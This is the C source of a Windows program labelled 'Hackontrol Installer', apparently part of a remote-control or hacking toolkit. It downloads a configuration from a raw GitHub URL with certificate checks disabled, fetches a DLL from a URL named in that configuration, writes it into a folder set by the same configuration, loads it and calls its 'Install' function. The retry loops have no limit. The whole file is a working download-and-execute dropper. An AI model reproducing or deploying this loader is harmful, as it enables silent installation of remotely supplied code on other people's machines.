#include <cJSON.h>
#define CURL_STATICLIB
#include <curl/curl.h>
#include <ShlObj_core.h>

#define SYSTEM_JSON "https://raw.githubusercontent.com/KHOPAN/Hackontrol/refs/heads/main/system/system.json"

typedef void(__stdcall* RUNDLL32FUNCTION) (HWND window, HINSTANCE instance, LPSTR argument, int command);

static const LPCWSTR programName = L"Hackontrol Installer";

static HANDLE processHeap;

typedef struct {
	PBYTE data;
	size_t size;
} DATABUFFER, *PDATABUFFER;

static void curlError(const LPCWSTR function, const CURLcode code) {
	static const LPCWSTR format = L"CURL error ocurred.\n%ws failed. Error code: 0x%04X Message:\n%S";
	const char* message = curl_easy_strerror(code);
	int length = _scwprintf(format, function, code, message);

	if(length < 1) {
		MessageBoxW(NULL, L"_scwprintf() failed in curlError()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	LPWSTR buffer = HeapAlloc(processHeap, 0, sizeof(WCHAR) * (length + 1));

	if(!buffer) {
		MessageBoxW(NULL, L"HeapAlloc() failed in curlError()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	if((length = swprintf_s(buffer, length + 1, format, function, code, message)) < 1) {
		HeapFree(processHeap, 0, buffer);
		MessageBoxW(NULL, L"swprintf_s() failed in curlError()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	buffer[length] = 0;
	MessageBoxW(NULL, buffer, programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	HeapFree(processHeap, 0, buffer);
}

static size_t curlWriteBuffer(const char* const data, size_t size, size_t count, const PDATABUFFER pointer) {
	size *= count;
	PBYTE buffer = HeapAlloc(processHeap, 0, pointer->size + size);

	if(!buffer) {
		return 0;
	}

	if(pointer->data) {
		for(count = 0; count < pointer->size; count++) {
			buffer[count] = pointer->data[count];
		}

		HeapFree(processHeap, 0, pointer->data);
	}

	for(count = 0; count < size; count++) {
		buffer[count + pointer->size] = data[count];
	}

	pointer->data = buffer;
	pointer->size += size;
	return size;
}

static void win32Error(const LPCWSTR function, const DWORD code) {
	static const LPCWSTR format = L"\n%ws() failed. Error code: 0x%08X (%lu) Message:\n%ws";
	LPWSTR message = NULL;

	if(!FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_MAX_WIDTH_MASK, NULL, code, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPWSTR) &message, 0, NULL)) {
		MessageBoxW(NULL, L"FormatMessageW() failed in win32Error()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	int length = _scwprintf(format, function, code, code, message);

	if(length < 1) {
		LocalFree(message);
		MessageBoxW(NULL, L"_scwprintf() failed in win32Error()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	LPWSTR buffer = HeapAlloc(processHeap, 0, sizeof(WCHAR) * (length + 1));

	if(!buffer) {
		LocalFree(message);
		MessageBoxW(NULL, L"HeapAlloc() failed in win32Error()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	length = swprintf_s(buffer, length + 1, format, function, code, code, message);
	LocalFree(message);

	if(length < 1) {
		HeapFree(processHeap, 0, buffer);
		MessageBoxW(NULL, L"swprintf_s() failed in win32Error()", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return;
	}

	buffer[length] = 0;
	MessageBoxW(NULL, buffer, programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	HeapFree(processHeap, 0, buffer);
}

int WINAPI WinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE previousInstance, _In_ LPSTR commandLine, _In_ int showWindow) {
	if(!(processHeap = GetProcessHeap())) {
		MessageBoxW(NULL, L"GetProcessHeap() failed.", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return 1;
	}

	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		curlError(L"curl_global_init()", code);
		return 1;
	}

	CURL* curl = curl_easy_init();
	int codeExit = 1;

	if(!curl) {
		MessageBoxW(NULL, L"CURL error ocurred.\ncurl_easy_init() failed.", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto globalCleanup;
	}

	if((code = curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0)) != CURLE_OK) {
		curlError(L"curl_easy_setopt(CURLOPT_SSL_VERIFYPEER)", code);
		goto easyCleanup;
	}

	if((code = curl_easy_setopt(curl, CURLOPT_URL, SYSTEM_JSON)) != CURLE_OK) {
		curlError(L"curl_easy_setopt(CURLOPT_URL)", code);
		goto easyCleanup;
	}

	DATABUFFER buffer = {0};

	if((code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer)) != CURLE_OK) {
		curlError(L"curl_easy_setopt(CURLOPT_WRITEDATA)", code);
		goto easyCleanup;
	}

	if((code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteBuffer)) != CURLE_OK) {
		curlError(L"curl_easy_setopt(CURLOPT_WRITEFUNCTION)", code);
		goto easyCleanup;
	}

	while(curl_easy_perform(curl) != CURLE_OK || !buffer.data || !curlWriteBuffer("", 1, 1, &buffer)) {
		if(buffer.data) {
			HeapFree(processHeap, 0, buffer.data);
			buffer.data = NULL;
			buffer.size = 0;
		}
	}

	cJSON* root = cJSON_Parse(buffer.data);
	HeapFree(processHeap, 0, buffer.data);

	if(!root) {
		MessageBoxW(NULL, L"cJSON_Parse() failed.", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto easyCleanup;
	}

	cJSON* locationItem = cJSON_GetObjectItem(root, "location");

	if(!locationItem) {
		MessageBoxW(NULL, L"Field 'location' not found", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	if(!cJSON_IsString(locationItem)) {
		MessageBoxW(NULL, L"Field 'location' is not a string", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	cJSON* installItem = cJSON_GetObjectItem(root, "install");

	if(!installItem) {
		MessageBoxW(NULL, L"Field 'install' not found", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	if(!cJSON_IsObject(installItem)) {
		MessageBoxW(NULL, L"Field 'install' is not an object", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	cJSON* nameItem = cJSON_GetObjectItem(installItem, "name");

	if(!nameItem) {
		MessageBoxW(NULL, L"Field 'install.name' not found", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	if(!cJSON_IsString(nameItem)) {
		MessageBoxW(NULL, L"Field 'install.name' is not a string", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	cJSON* urlItem = cJSON_GetObjectItem(installItem, "url");

	if(!urlItem) {
		MessageBoxW(NULL, L"Field 'install.url' not found", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	if(!cJSON_IsString(urlItem)) {
		MessageBoxW(NULL, L"Field 'install.url' is not a string", programName, MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteRoot;
	}

	LPCSTR location = cJSON_GetStringValue(locationItem);
	DWORD length = ExpandEnvironmentStringsA(location, NULL, 0);

	if(!length) {
		win32Error(L"ExpandEnvironmentStringsA", GetLastError());
		goto deleteRoot;
	}

	LPSTR locationBuffer = HeapAlloc(processHeap, 0, length);

	if(!locationBuffer) {
		win32Error(L"HeapAlloc", ERROR_FUNCTION_FAILED);
		goto deleteRoot;
	}

	if(!ExpandEnvironmentStringsA(location, locationBuffer, length)) {
		HeapFree(processHeap, 0, locationBuffer);
		win32Error(L"ExpandEnvironmentStringsA", GetLastError());
		goto deleteRoot;
	}

	DWORD error = SHCreateDirectoryExA(NULL, locationBuffer, NULL);

	if(error == ERROR_ALREADY_EXISTS || error == ERROR_FILE_EXISTS) {
		error = GetFileAttributesA(locationBuffer);

		if(error == INVALID_FILE_ATTRIBUTES) {
			HeapFree(processHeap, 0, locationBuffer);
			win32Error(L"GetFileAttributesW", GetLastError());
			goto deleteRoot;
		}

		if(!(error & FILE_ATTRIBUTE_DIRECTORY)) {
			if(!DeleteFileA(locationBuffer)) {
				HeapFree(processHeap, 0, locationBuffer);
				win32Error(L"DeleteFileW", GetLastError());
				goto deleteRoot;
			}

			if((error = SHCreateDirectoryExA(NULL, locationBuffer, NULL)) != ERROR_SUCCESS) {
				HeapFree(processHeap, 0, locationBuffer);
				win32Error(L"SHCreateDirectoryExW", error);
				goto deleteRoot;
			}
		}
	} else if(error != ERROR_SUCCESS) {
		HeapFree(processHeap, 0, locationBuffer);
		win32Error(L"SHCreateDirectoryExW", error);
		goto deleteRoot;
	}

	LPCSTR name = cJSON_GetStringValue(nameItem);
	error = strlen(name);
	LPSTR nameBuffer = HeapAlloc(processHeap, 0, length + error);

	if(!nameBuffer) {
		HeapFree(processHeap, 0, locationBuffer);
		win32Error(L"HeapAlloc", ERROR_FUNCTION_FAILED);
		goto deleteRoot;
	}

	DWORD i;

	for(i = 0; i < length; i++) {
		nameBuffer[i] = locationBuffer[i];
	}

	HeapFree(processHeap, 0, locationBuffer);

	for(i = 0; i < error; i++) {
		nameBuffer[length + i - 1] = name[i];
	}

	nameBuffer[length - 2] = '\\';
	nameBuffer[length + error - 1] = 0;

	if((code = curl_easy_setopt(curl, CURLOPT_URL, cJSON_GetStringValue(urlItem))) != CURLE_OK) {
		HeapFree(processHeap, 0, nameBuffer);
		curlError(L"curl_easy_setopt(CURLOPT_URL)", code);
		goto deleteRoot;
	}

	buffer.data = NULL;
	buffer.size = 0;

	while(curl_easy_perform(curl) != CURLE_OK || !buffer.data) {
		if(buffer.data) {
			HeapFree(processHeap, 0, buffer.data);
			buffer.data = NULL;
			buffer.size = 0;
		}
	}

	HANDLE file = CreateFileA(nameBuffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		HeapFree(processHeap, 0, buffer.data);
		HeapFree(processHeap, 0, nameBuffer);
		win32Error(L"CreateFileA", GetLastError());
		goto deleteRoot;
	}

	i = WriteFile(file, buffer.data, buffer.size, &error, NULL);
	HeapFree(processHeap, 0, buffer.data);
	CloseHandle(file);

	if(!i) {
		HeapFree(processHeap, 0, nameBuffer);
		win32Error(L"WriteFile", GetLastError());
		goto deleteRoot;
	}

	HMODULE executable = LoadLibraryA(nameBuffer);
	HeapFree(processHeap, 0, nameBuffer);

	if(!executable) {
		win32Error(L"LoadLibraryA", GetLastError());
		goto deleteRoot;
	}

	RUNDLL32FUNCTION function = (RUNDLL32FUNCTION) GetProcAddress(executable, "Install");

	if(!function) {
		win32Error(L"GetProcAddress", GetLastError());
		goto deleteRoot;
	}

	function(NULL, NULL, NULL, 0);
	MessageBoxW(NULL, L"Success", programName, MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	codeExit = 0;
deleteRoot:
	cJSON_Delete(root);
easyCleanup:
	curl_easy_cleanup(curl);
globalCleanup:
	curl_global_cleanup();
	return codeExit;
}
